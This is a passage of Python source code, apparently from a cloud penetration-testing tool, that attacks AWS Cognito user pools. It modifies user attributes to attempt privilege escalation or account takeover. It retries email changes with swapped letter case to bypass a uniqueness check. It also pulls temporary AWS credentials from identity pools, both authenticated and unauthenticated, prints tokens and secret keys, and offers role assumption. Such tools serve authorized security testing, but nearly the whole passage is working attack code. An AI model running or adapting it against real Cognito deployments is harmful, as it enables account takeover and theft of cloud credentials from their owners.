    newregion,
    att_clientId,
    att_userPoolId,
    cognito_identity_pools,
    identity_client,
    identity_pool,
):
    currentuser = client.get_user(
        AccessToken=tokens["AuthenticationResult"]["AccessToken"]
    )
    search_string = "custom"
    if any(
        search_string in attribute["Name"]
        for attribute in currentuser["UserAttributes"]
    ):
        print(
            "Custom attribute(s) found! Changing these may lead to privilege escalation."
        )
    else:
        print("No custom attributes found.")
    print(
        "Changing basic attributes such as email may lead to account takeover if they are used to identify users. "
    )
    print("Printing all current attributes: ")
    print(currentuser["UserAttributes"])
    prompt = (
        f"Enter attribute name to modify for user {currentuser['Username']} "
        "or hit enter to skip: "
    )
    attribute_name = input(prompt)
    prompt = (
        f"Enter attribute value to set for user {currentuser['Username']} "
        "or hit enter to skip: "
    )
    attribute_value = input(prompt)
    if attribute_name != "" and attribute_value != "":
        try:
            client.update_user_attributes(
                AccessToken=tokens["AuthenticationResult"]["AccessToken"],
                UserAttributes=[
                    {"Name": attribute_name, "Value": attribute_value},
                ],
            )
            print("Attribute updated!")
        except ClientError as error:
            error_code = error.response["Error"]["Code"]
            if attribute_name == "email" and error_code == "InvalidParameterException":
                print(
                    "Error when updating email attribute. This may be because the email is already in use. Attempting to change case to bypass this defense."
                )
                modified_value = attribute_value.swapcase()
                try:
                    client.update_user_attributes(
                        AccessToken=tokens["AuthenticationResult"]["AccessToken"],
                        UserAttributes=[
                            {"Name": attribute_name, "Value": modified_value},
                        ],
                    )
                    print("Attribute updated!")
                except ClientError as error:
                    code = error.response["Error"]["Code"]
                    print("FAILURE: ")
                    print("  " + code)
                    print("  Skipping user attribute modification...")
            else:
                code = error.response["Error"]["Code"]
                print("FAILURE: ")
                if code == "InvalidParameterException":
                    print("  InvalidParameterException")
                    print("  Skipping user attribute modification...")
                else:
                    print("  " + code)
                print("  Skipping user attribute modification...")
    else:
        print("Attributes not updated.")
        return None, None
    prompt = (
        f"Authenticate again as user {currentuser['Username']} "
        "to check for privilege escalation/account takeover? (Y/N): "
    )
    choice = input(prompt)
    if choice.lower() == "y":
        try:
            aws2 = AWSSRP(
                username=currentuser["Username"],
                password=att_password,
                client_id=att_clientId,
                pool_id=att_userPoolId,
                client=client,
            )
            tokens = aws2.authenticate_user()
            print("You're signed in as " + currentuser["Username"] + "!")
            print(
                "Your access token is: " + tokens["AuthenticationResult"]["AccessToken"]
            )
            print("Your ID token is: " + tokens["AuthenticationResult"]["IdToken"])
            print(
                "Your refresh token is: "
                + tokens["AuthenticationResult"]["RefreshToken"]
            )
            print("Your token type is: " + tokens["AuthenticationResult"]["TokenType"])
            credentials = get_identity_credentials(
                cognito_identity_pools,
                identity_client,
                tokens["AuthenticationResult"]["IdToken"],
                att_userPoolId,
                newregion,
            )
            if credentials is not None:
                print("Temporary credentials retrieved!")
                print(credentials)
            roles = get_assumable_roles(tokens["AuthenticationResult"]["IdToken"])
            prompt_assume_roles(
                identity_client,
                identity_pool,
                roles,
                newregion,
                att_userPoolId,
                tokens["AuthenticationResult"]["IdToken"],
            )
            prompt = "Modify more custom attributes? (y/n):"
            choice = input(prompt)
            if choice.lower() == "y":
                get_custom_attributes(
                    client,
                    tokens,
                    att_password,
                    newregion,
                    att_clientId,
                    att_userPoolId,
                    cognito_identity_pools,
                    identity_client,
                    identity_pool,
                )
            else:
                print("Exiting...")
                return tokens, credentials
        except SoftwareTokenMFAChallengeException as error:
            try:
                code = input(
                    "Please enter the MFA code generated by your application: "
                )
                print("Entering final MFA challenge")
                error_string = str(error)
                aws2session = re.search(r"'Session': '(.*?)'", error_string)
                if aws2session:
                    aws2sessionfinal = aws2session.group(1)
                else:
                    print("NO MATCH FOUND")
                    return None, None
                tokens = client.respond_to_auth_challenge(
                    ClientId=att_clientId,
                    ChallengeName="SOFTWARE_TOKEN_MFA",
                    Session=aws2sessionfinal,
                    ChallengeResponses={
                        "USERNAME": currentuser["Username"],
                        "SOFTWARE_TOKEN_MFA_CODE": code,
                    },
                )
                print("You're signed in as " + currentuser["Username"] + "!")
                print(
                    "Your access token is: "
                    + tokens["AuthenticationResult"]["AccessToken"]
                )
                print("Your ID token is: " + tokens["AuthenticationResult"]["IdToken"])
                print(
                    "Your refresh token is: "
                    + tokens["AuthenticationResult"]["RefreshToken"]
                )
                print(
                    "Your token type is: " + tokens["AuthenticationResult"]["TokenType"]
                )
                credentials = get_identity_credentials(
                    cognito_identity_pools,
                    identity_client,
                    tokens["AuthenticationResult"]["IdToken"],
                    att_userPoolId,
                    newregion,
                )
                if credentials is not None:
                    print("Temporary credentials retrieved!")
                    print(credentials)
                roles = get_assumable_roles(tokens["AuthenticationResult"]["IdToken"])
                prompt_assume_roles(
                    identity_client,
                    identity_pool,
                    roles,
                    newregion,
                    att_userPoolId,
                    tokens["AuthenticationResult"]["IdToken"],
                )
                prompt = "Modify more custom attributes?"
                choice = input(prompt)
                if choice.lower() == "y":
                    get_custom_attributes(
                        client,
                        tokens,
                        att_password,
                        newregion,
                        att_clientId,
                        att_userPoolId,
                        cognito_identity_pools,
                        identity_client,
                        identity_pool,
                    )
                else:
                    print("Exiting...")
                    return tokens, credentials
            except ClientError as err:
                print(err)
                return None, None


def get_identity_credentials(
    cognito_identity_pools,
    identity_client,
    id_token=None,
    user_pool_id=None,
    region=None,
):
    for identity_pool in cognito_identity_pools:
        if identity_pool["Region"] == region:
            try:
                if id_token is None:
                    print("Attempting unauthenticated retrieval of identity Id")
                    identity_id = identity_client.get_id(
                        IdentityPoolId=identity_pool["IdentityPoolId"]
                    )
                    print(f"Identity ID: {identity_id}")
                if id_token is not None:
                    logins = {
                        "cognito-idp."
                        + region
                        + ".amazonaws.com/"
                        + user_pool_id: id_token
                    }
                    print("Attempting authenticated retrieval of identity Id")
                    identity_id = identity_client.get_id(
                        IdentityPoolId=identity_pool["IdentityPoolId"], Logins=logins
                    )
                    print(f"Identity ID: {identity_id}")
            except ClientError as error:
                print("FAILURE: ")
                code = error.response["Error"]["Code"]
                print("  " + code)
                continue
            if id_token is not None:
                try:
                    logins = {
                        "cognito-idp."
                        + region
                        + ".amazonaws.com/"
                        + user_pool_id: id_token
                    }
                    print("Attempting authenticated retrieval of temporary credentials")
                    identity_creds = identity_client.get_credentials_for_identity(
                        IdentityId=identity_id["IdentityId"], Logins=logins
                    )
                except error as error:
                    code = error.response["Error"]["Code"]
                    if code == "UnauthorizedOperation":
                        print("  Access denied to GetId or GetCredentialsForIdentity.")
                    else:
                        print("  " + code)
                    print(
                        "  Skipping identity pool enumeration for this identity client..."
                    )
            else:
                try:
                    print(
                        "Attempting unauthenticated retrieval of identity Id credentials"
                    )
                    identity_creds = identity_client.get_credentials_for_identity(
                        IdentityId=identity_id["IdentityId"]
                    )
                except error as error:
                    code = error.response["Error"]["Code"]
                    if code == "UnauthorizedOperation":
                        print("  Access denied to GetId or GetCredentialsForIdentity.")
                    else:
                        print("  " + code)
                    print(
                        "  Skipping identity pool enumeration for this identity client..."
                    )
            if identity_creds["Credentials"]["AccessKeyId"] is not None:
                print("Access Key ID found.")
                identity_pool["AccessKeyId"] = identity_creds["Credentials"][
                    "AccessKeyId"
                ]
                print(identity_pool["AccessKeyId"])
            if identity_creds["Credentials"]["SecretKey"] is not None:
                print("Secret Key found.")
                identity_pool["SecretKey"] = identity_creds["Credentials"]["SecretKey"]
                print(identity_pool["SecretKey"])
            if identity_creds["Credentials"]["SessionToken"] is not None:
                print("Session Token found.")
                identity_pool["SessionToken"] = identity_creds["Credentials"][
                    "SessionToken"
                ]
                print(identity_pool["SessionToken"])
            if identity_creds["Credentials"]["Expiration"] is not None:
                print("Expiration found.")
                identity_pool["Expiration"] = identity_creds["Credentials"][
                    "Expiration"
                ]
                print(identity_pool["Expiration"])
                return identity_pool
